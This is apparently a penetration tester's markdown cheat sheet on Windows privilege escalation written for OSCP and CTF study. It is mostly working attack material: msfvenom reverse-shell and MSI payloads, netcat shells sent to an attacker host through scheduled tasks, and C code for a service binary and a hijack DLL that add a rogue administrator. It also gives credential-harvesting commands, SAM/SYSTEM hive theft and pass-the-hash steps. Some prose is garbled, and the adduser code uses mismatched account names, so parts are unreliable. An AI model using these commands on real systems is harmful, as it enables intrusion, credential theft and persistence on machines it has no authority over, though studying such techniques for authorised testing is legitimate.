# Windows Privilege Escalation Vectors

[[Privilege-Escalation]] is action taken by a operator to gain greater privileges on a machine than the current user context. Usually this means escalating to be a member `Local Administrators` group or the `NT AUTHORITY\SYSTEM` [LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account. [[Privilege-Escalation]] commonly without binary exploitation focuses on misconfigurations surrounding Windows Permissions. Defaults, design that makes it more difficult to be safe and "best"  practice that in actuality not are the systemic issue in the root blame for insecure machines. Third party software can be grant permissions alter the file system, but either make it then insecure or not implement reconfiguration to amend file system permissions. Sysadmin can implement managing that is not actuallly secure or practice management that makes it more difficult to expose insecurities. Sysadmin like GUI the don't see actual special permission because does not show which permissions, so use the command line - it many clicks deep in a window or GUI does not display actualities. 

Considerations:
- Enumerate, enumerate and [[Windows-Privilege-Escalation-Enumeration]]
- Know how it should be configured, Script and Tools should be tool to filter out information not a exploit button
- `netsh` is very powerful and widely used by Devs
- Never forget Sysinternals - [[Sysinternals]] - it wont be treated as malware, but Opsec still applies!
- Find insecure registry key - perform sub-key inheritance check

Replacing anything considerations:
- With `.msi`, install shield copies your permissions!
- Create proxy dlls, before sideloading dlls - the process crash because your [[MSFVenom-Payloads]] does not have the functionality to maintain process. If you must sideload then use non callback, just add a user.
- `program.exe` for 0day naming by Jake Williams. Game-on tip is to create a `program.exe` on your box that is a just application that can alert you that unquoted path vulnerability exists in some third party software equals disclosure 0day.
- Replacing a  `.exe` fails - Windows locks "open exclusive" exes at runtime, Windows does not page executable to pagefile, the copy is on disk why both. Also any autostart cannot be replaced
- Modify service conf, usually not conf, but the scripting
- Registry key modifications allow replacement of image path - sc does not read Registry key as runtime only at boot...so you have to reboot
- SYSWOW64 

DLL search order:

Unsafe | Safer
--- | ---
Current Directory | Directory Application is loaded 
Directory Application is loaded | System32
System32 | 16 bit system file: Windows\System 
16 system file: Windows\System | C:\Windows
C:\Windows | Current Directory
%PATH% | %PATH%

AppLocker Bypass
By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
  [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
  [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
  

For Manual Enumeration see (Again) [[Windows-Privilege-Escalation-Enumeration]]
For [[Windows-File-Transfers]]
For [[WMI-Commands]]
For [[Windows-Commands]]
For [[PrivEsc-Important-Windows-Locations]]
For [[Powershell-Versions]]
Check out [[Kali-Windows-Resources]] for selection of binaries and such to transfer!
For Powershell Bypassing see [[Windows-Privilege-Escalation Bypassing-Contrained-Powershell]]
For ASMI bypassing [[AMSI-Bypassing]]
For Working List on [[Windows-Privilege-Escalation-Scripts-And-Tools]]

## Always Check Arch before making shells!
Careful of x64, x86 (32 bit reminder) ,x86_64 etc  with windows!

[[MSFVenom-Payloads]] - beware the [[Antivirus-Evasion]] that is probably required on modern Windows systems [[Metasploit-AV-Evasion]]
Extension for `AlwaysInstallElevated` == msi
Extension for Dynamic-Linked-Libraries == dll 

## Windows X + Y = Vulnerable

Nice quick reference table of if Windows version X with Y patch level, just start here before enduring the spiralling nightmare of compatibility.

Arch | Potential Solution
--- | ---
Windows XP | Metasploit is really your best best
Windows 10 and Server 2016/2019 | Potato Vulns


# Escalation Vectors

## Insecure Directory permissions

**THIS IS FREQUENT CHAINING OF INSECURITIES - OWNERSHIP AND INTRACTABILITY IS CRITICAL TO EVERYTHING `icacls.exe` IS YOU BEST FRIEND**
You are looking for with  `icacls` either a directory or tree of directories due to Windows Pathing for locating executables:
- Write/Add file
- Delete permission + search path or anywhere else on search path. 

#### RDP Access?

Check [[Bypassing-Windows-User-Account-Control]]
#### PowerShell Credentials

Need to create credential objects
```powershell
$password = ConvertTo-SecureString "password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Administrator", $password)
```

## Whoami /priv & SePrivileges

[[SePrivilege-Token-Table]]
[Whoami Priv2Admin Definitive List](https://github.com/gtworek/Priv2Admin)
[Whoami /priv SeImpersonate Privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

From the `whoami /priv` privileges can be displayed. Certain [[Windows-Groups]] have privileges by default.

- **SeBackUp / SeRestore**
SeBackup and SeRestore privileges allow users to read and write to any file in the system, bypass DACL. PrivEsc be backuping SAM and SYSTEM hives. See [[SeBackupPrivilege]]
```powershell
reg save hklm\system C:\path\to\exfil\out\from
reg save hklm\sam C:\path\to\exfil\out\from
```
Use [[Impacket-Cheatsheet]], smbshare  to `copy` or `xcopy`  or `move` the hives your smb share. Then perform a [[Pass-The-Hash]] with Adminstrators hash.

- **SeTakeOwnership**
SeTakeOwnship allows file ownership transference to then `icacls` to grant full permissions over that file, replace with cmd.exe to PrivEsc:
```powershell
takeown /f C:\path\to\an.exe
icalcs C:\path\to\an.exe /grant <CurrentUser>:f
copy C:\path\to\cmd.exe C:\path\to\an.exe
```
- **SeImpersonate / SeAssignPrimaryToken**
SeImpersonate and SeAssignPrimaryToken abuse consists of ability to spawn a process or thread under a different user's security context. 
- Services and Administrators get SeImpersonate

#### Rogue Potato - Token Impersonation
```powershell
sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
C:\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999 # in local service reverse shell run exploit
``` 

#### PrintSpoofer - Token Impersonation
```
C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
C:\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i # in local service reverse shell run exploit
```
[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases)

## Privileged Groups

Read [[Windows-Groups]]: TLDR:
[Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) have the [[SeBackupPrivilege]] 
[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) can read event logs from local computers, look in the logs for anything before erasing..
```powershell
# Searching security logs 
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Passing credentials with  wevtutil
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
# Requires administrative privileges to use the *-WinEvent commands
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
# To run as a specific user:
# -Credential 
```

can configure DNSserver 


## SPN map
```powershell
setspn -T medin -Q  */*        # extract all accounts in the SPN (service principle name) service and account mapping, may contain passwords..
```

## Services
See [[Windows-Services]] and [[Windows-System-And-Service-Privileges]]

Wmic available
```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```
Wmic unavaliable
```powershell
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

```powershell
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
# Look for \Program Files\* as they are User installed and DEv is charge directory structure and persmissions of Software.
```
Check here for detailed [[Windows-Permissions]] descriptions. 
```powershell
icacls *.exe
```
Replace executable with malicious binary, stop the original, get start options.
```powershell
# compile PrivEsc code C,C++ and C# are probably best choices
move "*.exe" "original.exe.bkp" # backup
move exploit.exe "\*exe's\path"
net stop Vulnerable_Service
wmic service where caption="Vulnerable_Service" get name, caption, state, startmode
# Check the start mode and adjust accordingly
```

Service Binary Hijacking
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'TARGETSERVICE'}

icacls "C:\PATH"
```

Replace some service binary with an adduser.exe
```c
#include <stdlib.h>
// x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
int main ()
{
  int i;
  
  i = system ("net user badadmin password123! /add");
  i = system ("net localgroup administrators badadmin123 /add");
  
  return 0;
}
```

```powershell
# If we can stop and start service
net stop $SERVICENAME
# If StartMode is set to Auto (autorun on boot)
shutdown /r /t 0

# If we ahave Full permissions on service binary
Install-ServiceBinary -Name 'SERVICENAME'
# Get all modifiable paths
$ModifiableFiles = echo 'PATHTOBINARY' | Get-ModifiablePath -Literal
# Add an argument to check if function provides the correct output
# Execute both a faux arguement and actual for empiricism 
$ModifiableFiles = echo 'PATHTOBINARY $argument' | Get-ModifiablePath -Literal
```
## Insecure Service permissions
```powershell
accesschk.exe /accepteula -uwcqv <user> <service> # sysinternals
sc qc <service>
sc config <service> binpath= "pathtoreverseshell.exe" obj= LocalSystem
net start <service>
# Or
sc stop <service>
sc start <service>
```
With powershell use:
```powershell
sc.exe # sc is Set-Content!
```
Use the correct format with msfvenom `-f exe-service`.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4445 -f exe-service -o rev-svc.exe
```

## Unquoted Service Path

Attack then levages the algorithm that search for mapped relevant services additional alternate interpretable locations and between non-explicitly declared file paths with whitespace. Unquoted service path are forgotten because developers forget extra `"`s that dont end up in the registry.  If unquoted the path is then parsed as if the path ends in an executable accepting arguments.
Requires: 
1. Write permissions to a `service`'s main directory tree, but cannot replace files within the tree. 
2. The path to the service must contain `whitespace` character like third party software directory `\Program Files\Insert Your Software\Service Location\here.exe`; 

Developers must ensure the that paths containing spaces are enclosed in quotation marks otherwise the path is interpretered by the search algorithm. Enumerate either with:
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
```
PowerUp PowerShell module - [[PowerSploit-Helpsheet]]
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```
With PowerShell - `CimInstance`s are most Administrative only 
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | findstr /si " "
```
`wmic` deprecated as of Windows 10
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
# Check permissions on the path
icacls "C:\VULN PATH\PATH"
# If we can stop and start service
net stop $SERVICENAME
# If StartMode is set to Auto (autorun on boot)
shutdown /r /t 0

move X.exe C:\VULNPATH\WSPRIOR\WSTO\ACTUAL\BINARY
# PowerUp.ps1
Write-ServiceBinary -Name 'SERVICENAME' -Path "C:\VULNPATH\Hijack.exe"
# And restart
Restart-Service 'SERVICENAME'
```

[[Meterpreter-Commands]]
```msfconsole
use exploit/windows/local/trusted_service_path
```
[[PowerSploit-Helpsheet]]
```powershell
sc qc <unquotedsvc> # Query a service that has BINARY_PATH_NAME that is UNQUOTED AND CONTAINS SPACES
icacls <.exe>
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" # sysinternals
```

```bash
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4444 -f exe-service -o svc-exe.exe
```

```powershell
# File transfer
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc
# or
sc stop unquotedsvc
sc start unquotedsvc
```
[Pentestlab](https://pentestlab.blog/2017/03/09/unquoted-service-path/)

`program.exe` for 0day naming by Jake Williams. Game-on tip is to create a program.exe on your box thats a just application that can alert you that unquoted path vulnerabiltiy exists in some third party software equals disclosure 0day. 

## Insecure service executables

If service's executable DACL is well configured and service binary path is correctly quoted - should DACL allow modification of the configuration of a service then reconfigure it!
```powershell
sc qc filepermsvc # Find a service that runs with SYSTEM privileges
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe" # sysinternals - check writability
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y # replace the filepermservice.exe
# (Re)start service
net start filepermsvc 
# or 
sc stop filepermsvc
sc start filepermsvc
```

## IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. `web.config` store the configurations found either:
```powershell
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
It can contain passwords.
```powershell
# Read hacker read
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


## Splunk Endpoints?

On endpoints, [[Splunk]] sends log data back to centralized location, if it does not have any authenication then there is code execution if is running as `SYSTEM$` consider reviewing: [Splunk Universal Forwarder Hijacking](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) and [SplunkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/).

## Unattended Windows Installations

Credentials maybe found in this xml files if batch installation on large number of hosts has not been cleaned up by a SysAdmin
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
## Autorun executables
```powershell
# WARNING
# BEWARE
# FOR this to work you would have to restart a box
# OSCP exam or CTFs probably want you to turn off the *sigh* box  
#
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe" # sysinternals - check writablity
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y # copy reverse shell and overwrite the autorun
# restart system
```

## AlwaysInstalledElevated

Jake Williams:  `AlwaysInstalledElevated` check if its an `.msi`, commonly found in 500-5000 employee size companies, not enterprises.
```powershell
# Some PrivEsc related material online does not include the /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Query Both
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # If both keys are set 1 (0x1)
```
On attackbox:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKBOX LPORT=$PORT -f msi -o reverse.msi # Beware of Arch
# Also requires metasploit handler module configured accordingly 
msiexec /quiet /qn /i C:\Windows\Temp\reverse.msi 
```

## Credentials

In files, memory or [[Windows-Registry]]
```powershell
findstr /si password *.xml *.ini *.txt *.config
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# WDigest if active store plain-text passwords are stored in LSASS
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential 
# Windows > 8.1 LSA protection for the LSA to prevent untrusted processes from being able to read its memory or to inject code
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
# Windows 10 Credential Guard
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
# Cached Domain Credentials
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

#### Volume Shadow Copy Service
If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
```powershell
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
# List shadow copies using diskshadow
diskshadow list shadows all
  
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

#### Backup SAM and SYSTEM files

[[Impacket-Cheatsheet]] - `secretsdump`
```powershell
icacls C:\Windows\Repair
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\ # These can often be transfered and cracked
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

#### Passwords in the registry
```powershell
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" # For admin autologons!
winexe -U 'admin%password' //MACHINE_IP cmd.exe # Kali winexe
```
PuTTy is an SSH client commonly found on Windows systems users can store session to retrieve the store d proxy credentials from proxcy configurations that are in plaintext 
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s
```

#### Saved Credentials:
```powershell
cmdkey /list                                    list saved credentials
runas /savecred /user:admin reverse_shell.exe   query /savedcred
vaultcmd /list
# Web credentials, Windows credentials, Generic credentials. Certificate-based credentials
vaultcmd /listproperties:"$category" 
# Will display the number, location in AppData and protection method
vaultcmd /listcreds:"$category" # information about stored credentials
```

Autologon Credentials
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon 
```

#### Password Mining Configuration Files
```
# Look for Unattend.xml used by sysadmins to setup systems, should be deleted.
# Finding unquoted service path vulnerabilities
wmic service get name,displayname,pathname,startmode | Sort
#NEED A powershell command to find the unquoted path pipe
sc qc [service]        #  to query binary path service
```

#### Passwords in Unattended.xml
```
C:\Windows\Panther\Unattend\Unattended.xml
```

#### Password Mining Memory
```bash
# Attack box
msfconsole:
use auxiliary/server/capture/http_basic
set uripath x
run
```
Then on target
```powershell
# browser -> http://attackbox_address/x
# open cmd
taskmgr
# right-click iexplorer.exe of "Image Name" column
# select "Create Dump File"
# Copy file to attack box
# On attack box
strings dump.DMP | grep "Authorization: Basic"
echo -ne base64string | base64 -d
```

## Weak Registry Permissions

Register keys have permissions, but register values do not have permissions. Values are inheirated from keys, subkeys if value or key has control of execution of a privileged process has write permissions we run code with elevated permissions. Always perform subkey inherence check.

Register keys have Plugin dlls. Point to dll and bam, but msfvenom is not your friend
[subinacl](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) permission of reg key as Powershell `get-acl` has bitmask conversion - high number means special permissions but unweildy output.
```
sc qc regsvc # Find weak registry permission, a service that runs with SYSTEM privileges
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc # sysinternals
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f 
net start regsvc
```

## Finding services with modifiable registry values
```powershell
sc qc # query service configuration
```
Importantly the `BINARY_PATH_NAME` parameter is executed by `SERVICE_START_NAME`.
All service configurations are `HKLM\SYSTEM\CurrentControlSet\Services\`

```powershell
# accesschk is sysinternals
# use icalcs
icacls C:\vulnerable\service.exe
# IF group permissions allow for modify permission (M) on a the service executable -> overwrite it with a payload of choice.
accesschk.exe -kvqwsu "Authenticated Users" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula
```

## Binary Path
```powershell
reg query "HKLM\System\CurrentControlSet\Session Management\Environment"
%PATH% # if writable by authenticated users
# prepended paths are bad
reg32
netsh # devs use it alot it can tcpdump,but wih processes

accesschk64.exe -wuvc daclsvc # sysinternals - if user has SERVICE_CHANGE_CONFIG permission
sc config daclsvc binpath="net localgroup administrators [username] /add"
sc start daclsvc
net localgroup administrators
```

## Service Escalation Registry
Use [subinacl](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) 
```powershell
reg query 
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl # Avoid powershell
Copy ‘C:\service.c # Edit file, either on box or on attack box, depending on local compiler and noise:
# replace or add a system() function call to:
"cmd.exe /k net localgroup adminstrators [username] /add"
# x86_64-w64-mingw32-gcc windows_service.c -o x.exe
# Copy back to /Temp
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f # Edit path
sc start regsvc
netlocalgroup administrators # check success
```

## Passing the hash
```powershell
pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe # Full hashes delimitereed by colon.

# Alternative:

responder.py #TODO!!
```

## Scheduled Tasks

PowerShell `schtasks`
```powershell
schtasks /query /fo LIST /v
# By task name
schtasks /query /tn $task_name /fo list /v
```
`Task to Run` parameter indicates what gets executed  
`Run as User` parameter indicates who executes task  
Use `icalcs` to check file permissions on the executable:
```powershell
icacls c:\path\to\task\to\run.extension
```
Replace with compatible version of `netcat`, `socat`, `msfvenom` reverse shell, etc
```powershell
echo c:\path\to\connection\method\nc64.exe -e cmd.exe $ATTACKER_IP 4444 > c:\path\to\task\to\run.extension
```
Then force task to run, remember to setup whatever listener required:
```powershell
schtasks /run /tn $task_name
```

Make a scheduled task, that runs `nc.exe`, if lacking privileges give shell those upon new schedule task shell for another shell...
```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe $ip 4444 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
# Catch reverse shell
# We may lack some privileges
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
# Catch another shell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe $ip 4444 -e cmd.exe`""
# Register SchedueledTask
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
# Start Task
Start-ScheduledTask -TaskName "GrantAllPerms"
```

Sysinternals
```powershell
\accesschk.exe /accepteula -quvw user C:\ScheduleTask.ps1 # systernals - if running it can be run somehow as SYSTEM
# If writable:
echo reverseShell.exe >> C:\ScheduleTask.ps1 # append .exe
```

## Insecure GUI Apps
```powershell
tasklist /V # GUI apps that can be run as Admin 
# In file dialogue box 
file://c:/windows/system32/cmd.exe
```

## Startup Applications 
```powershell
# BEWARE YOU NEED TO RESTART/LOGOFF! Requires trigger!
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" # sysinternals
# Create a shortcut to your reverse shell in StartUp directory.
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# place reverse shell in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

## DLL hijacking!

DLL search Order [Microsoft Documentation]()
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Entry point functions for DLL hijacking
```powershell
DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH
```

```powershell
# Depending on Windows and PowerShell versions and current user's Privileges
# RDP can solve this issue!
# Get-CimInstance
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# Get-Service
Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object DisplayName, Status, ServiceName, DisplayName, StartType
# Get-WmiObject
Get-WmiObject -Query "SELECT Name,State,PathName FROM Win32_Service WHERE State='Running'" | Select-Object Name, State, PathName
# .NET Classes
[System.ServiceProcess.ServiceController]::GetServices() | Where-Object {$_.Status -eq 'Running'} | Select-Object DisplayName, Status, ServiceName


# Check File permissions
icacls "C:\PATH"
# Restart Service
Restart-Service
# Environment VariablesM #2) by connecting to the bind shell on port 4444. Use the methods covered in this Module to elevate your privileges to an administrative user. Enter the flag, which is located in **C**
$env:path
```

Do not forget to `sed` to replace the reason!
`sed -i templateAddUser.dll 's/ul_reason_for_call/REASON/g'`

```cpp
#include <stdlib.h>
#include <windows.h>

// x86_64-w64-mingw32-gcc baddll.cpp --shared -o bad.dll

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user badadmin password123! /add");
  	    i = system ("net localgroup administrators badadmin /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```powershell
# Find a dll to exploit
# Get the windows_dll.c
# Edit, replacing the system() call to:
cmd.exe /k net localgroup administrators user /add
#compile
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
# place the dll
sc stop dllsvc 
sc start dllsvc # Or start a service that use it.
```

## WSUS

If updates are run via http, not https:
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
# If you get:
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
	WUServer REG_SZ http:// # Some http server! 
# AND
HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer # == 1 
```
Use: [wsuxploit](https://github.com/pimps/wsuxploit) or [pywsus](https://github.com/GoSecure/pywsus)


## Powershell downgrade
```powershell
powershell -version 2
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```


## UAC bypass
Check out [[Bypassing-Windows-User-Account-Control]] for more!
```powershell
# If Windows 10 build 1709, Microsoft's fodhelper.exe
# Admin user can silently bypass
# Settings -> Apps & features ->  Manage optional features
fodhelper.exe # by default runs on High Integrity 
# Sysinternals sigcheck to inspec manifest
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

## Potato Exploits 

[[Potato-Exploits]] are numerous, here is Hot Potato for example: 
```powershell
powershell.exe -nop -ep bypass
https://github.com/Kevin-Robertson/Tater.git
Import-Module C:\Path\To\HotPotato.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

## Partially Uninstalled Software

Jake Williams *"COM objects are the devil"*, they are controlled registery values specifically InProcServer32 value. Stale COM objects remain and current service executables will try invoke COM objects with specific class ids. With bad file permissions we can escalate privileges. [Casey Smith @Subtee/BoHop Talk](https://www.youtube.com/watch?v=3gz1QmiMhss) and [Writeup of Talk by enigma0x3](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)*"Some environments use whitelisting to prevent unsigned Windows Scripting Host (WSH) files from running, especially with the rise of malicious .js or .vbs files. However, by “injecting” our malicious code into a Microsoft signed WSH script, we can bypass such a restriction."*. It super stealthy persistence as no one checks at your COM objects. 

Upcoming

## AppLocker Bypassing

By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users:
- [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
- https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
- [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)

## Kernel exploits

Enumerate the [[Windows-Kernel]]
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
driverquery /v
```
Research potential exploit...

[[WESNG-Helpsheet]] if you have `systeminfo` or equivalent output.


## References

[THM Windows PrivEsc Room](https://tryhackme.com/room/windowsprivesc20)
[THM Lay of the Land Room](https://tryhackme.com/room/thelayoftheland)
[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
[PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
[Wild west hackin' Fest Jake Williams - Talk: Elevating your Windows Privilege like Boss](https://www.youtube.com/watch?v=SHdM197sbIE')
